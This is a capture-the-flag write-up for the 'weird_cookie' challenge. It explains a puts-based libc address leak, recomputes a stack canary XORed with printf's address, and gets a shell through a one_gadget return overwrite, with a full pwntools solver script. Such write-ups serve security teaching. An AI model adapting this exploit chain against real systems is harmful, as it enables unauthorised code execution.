[[Pwn]]

## Leaking Address with Puts() And Generating Canary Binary Exploitation

- This binary has static canary that xored with `printf` address every time when going to main function to get the final canary.
- Our input is stored in buffer variable that only afford 40 bytes data, and we have our overflow at read(0,buffer,64). We only have 24 bytes overflow, but It's enough to overwrite the return address because canary is 16 bytes and the return address is 8 bytes
- If we pass more than 40 bytes characters, the puts(buffer) will start leaking address. I got stack address leak at the 16th leak by passing 56 bytes characters. The leak is `__libc_start_main+96` so I need `__libc_start_main` offset + 96 for the purpose of calculating LIBC base address. Use `readelf` to get the `__libc_start_main` offset.
- Because we get the LIBC base address, we can start generate the canary by xoring the initial canary value with the address of `printf`
- We only have 8 bytes to overwrite the return address, so we can't use ret2libc technique, but we can use one gadget to spawn a shell. One gadget only requires 8 bytes to spawn a shell because it's `LIBC Address + onegadget offset` so it's only 8 bytes.

## Solver
```python
from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
breakrva 0x11a8
breakrva 0x1213
breakrva 0x1257
breakrva 0x1263
continue
'''.format(**locals())

exe = "./weird_cookie_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"

io = start()
libc = ELF("./libc-2.27.so")
offset = 56
payload = b'A' * offset

io.sendline(payload)
io.recvuntil("A"*offset)
io.recvline()
libc_start_main_leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
libc_start_main_leak = int(hex(libc_start_main_leak) + "00", 16)
info(f"libc start main leak : {hex(libc_start_main_leak)}")
libc.address = libc_start_main_leak - (0x021ba0 + 96)
info(f"LIBC Base : {hex(libc.address)}")
info(f"Printf address : {hex(libc.sym['printf'])}")
hardcoded_canary = 1311768467463790321
canary = hardcoded_canary ^ libc.sym["printf"]
info(f"Canary : {hex(canary)}")
offset_canary = 40
oneshot = [0x4f2a5, 0x4f302, 0x10a2fc]
payload2 = flat({offset_canary: [
	canary, b'\x00' * 8,
	libc.address + oneshot[1]
]})

io.sendline(payload2)
io.interactive()
```